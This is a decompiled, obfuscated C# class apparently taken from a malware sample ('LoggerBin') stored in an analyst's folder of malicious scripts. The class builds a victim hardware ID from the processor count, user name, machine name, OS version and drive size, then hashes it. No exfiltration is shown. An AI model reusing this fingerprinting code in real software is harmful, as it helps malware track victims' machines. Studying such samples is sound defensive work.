// Decompiled with JetBrains decompiler
// Type: dWl.QWI
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace dWl
{
  internal static class QWI
  {
    private static string HWID;
    internal static QWI jlr;

    public static string fCL()
    {
      if (!string.IsNullOrWhiteSpace(QWI.HWID))
        return QWI.HWID;
      try
      {
        QWI.HWID = exB.bx(Environment.ProcessorCount.ToString() + QWI.Ilu() + QWI.XlW() + (object) Environment.OSVersion + (object) new DriveInfo((string) QWI.Clz((object) Environment.SystemDirectory)).TotalSize, exB.TIg);
        return QWI.HWID;
      }
      catch
      {
        return w4.bx(12892, w4.vY);
      }
    }

    private static string fCV(string _param0)
    {
      try
      {
        byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(_param0));
        int num1 = 0;
        if (QWI.sls() == null)
          num1 = 0;
        switch (num1)
        {
          default:
            StringBuilder stringBuilder = new StringBuilder();
            foreach (byte num2 in hash)
              stringBuilder.Append(num2.ToString(w4.bx(12912, w4.vY)));
            return stringBuilder.ToString().Substring(0, 10).ToUpper();
        }
      }
      catch
      {
      }
      return Path.GetRandomFileName().Replace(w4.bx(286, w4.vY), "");
    }

    static QWI()
    {
      yd.bx(yd.EI);
      QWI.HWID = string.Empty;
    }

    internal static object Ilu() => (object) Environment.UserName;

    internal static object XlW() => (object) Environment.MachineName;

    internal static object Clz([In] object obj0) => (object) Path.GetPathRoot((string) obj0);

    internal static bool XlV() => QWI.jlr == null;

    internal static QWI sls() => QWI.jlr;
  }
}
